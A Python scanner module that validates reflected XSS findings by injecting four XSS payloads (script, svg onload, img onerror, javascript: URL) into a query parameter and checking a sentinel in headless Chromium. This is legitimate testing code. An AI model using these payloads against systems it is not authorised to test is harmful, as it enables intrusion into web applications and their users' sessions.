"""
Real XSS validation using Playwright headless Chromium.
A finding is ONLY confirmed when the injected payload triggers a JS dialog.
"""
import asyncio
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from playwright.async_api import async_playwright

PAYLOADS = [
    "<script>window.__xss_pwn=1</script>",
    "\"><svg/onload=window.__xss_pwn=1>",
    "javascript:window.__xss_pwn=1",
    "<img src=x onerror=window.__xss_pwn=1>",
]

async def validate_xss(url: str, param: str, timeout: int = 15) -> dict | None:
    """
    Returns confirmed finding dict or None.
    Strategy:
      1. Inject each payload into the parameter
      2. Load page in headless Chromium
      3. Check if window.__xss_pwn === 1 was set (means JS executed)
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        try:
            for payload in PAYLOADS:
                qs[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

                ctx = await browser.new_context()
                page = await ctx.new_page()

                executed = {"flag": False}
                # Catch dialogs (confirms execution)
                page.on("dialog", lambda d: (executed.update(flag=True), asyncio.create_task(d.dismiss())))

                try:
                    await page.goto(test_url, timeout=timeout * 1000, wait_until="domcontentloaded")
                    # Probe the injected sentinel
                    pwn = await page.evaluate("() => window.__xss_pwn === 1")
                    if pwn or executed["flag"]:
                        body = await page.content()
                        await ctx.close()
                        return {
                            "validated": True,
                            "type": "Reflected XSS",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": "JS sentinel triggered in headless browser",
                            "response_snippet": body[:500],
                        }
                except Exception:
                    pass
                finally:
                    await ctx.close()
        finally:
            await browser.close()
    return None  # No FP — discarded
